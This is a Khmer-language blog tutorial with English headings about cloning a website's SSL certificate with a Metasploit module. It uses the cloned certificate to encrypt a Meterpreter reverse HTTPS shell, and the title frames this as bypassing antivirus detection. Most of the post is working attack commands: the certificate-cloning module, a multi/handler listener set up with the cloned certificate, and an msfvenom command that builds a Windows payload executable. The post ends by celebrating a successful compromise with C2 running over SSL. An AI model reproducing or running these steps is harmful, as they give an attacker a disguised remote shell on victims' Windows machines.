---
title: "Impersonate SSL - MSF Bypass Detection"
date: 2022-12-03T21:01:06+07:00
description: ក្លែងបន្លំ SSL និងបញ្ជៀសពីការចាប់របស់ AV
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- metasploit
- ssl
- bypass
categories:
- CA
series:
- WinExE
image: images/feature2/article-1.png
---

#### Clone SSL Certification

តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។

ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight zsh "linenos=table" >}}
use auxiliary/gather/impersonate_ssl
set rhosts https://example.com/
exploit
{{< / highlight >}}

![SSL certificate cloning](/en/posts/img/2022/12/impersonate-ssl/clone-ssl.jpg)

ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។

#### Meterpreter Using SSL Connection

ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។

បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight zsh "linenos=table" >}}
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.xxx.xxx
set lport xxx
set stagerverifysslcert true
set handlersslcert /xxx/xxx/xxx/cert.pem
exploit
{{< / highlight >}}

#### Generate HTTPS Malicious Payload

បង្កើតមេរោគតាមរយៈ Msfvenom និងជ្រើសរើស HTTPS Reverse Shell ។

{{< highlight plain "linenos=table" >}}
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.xxx.xxx lport=xxx -f exe -b '\x00' -o ~/Desktop/s0rry.exe
{{< / highlight >}}

![Generate Payload](/en/posts/img/2022/12/impersonate-ssl/generate-payload.jpg)

#### Exploited

សាកល្បងបើកដំណើរការមេរោគក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូ។

![Exploited](/en/posts/img/2022/12/impersonate-ssl/exploited.jpg)

ជោគជ័យ!!! C2 ពេលនេះដំណើរការនៅលើ SSL Encryption ៕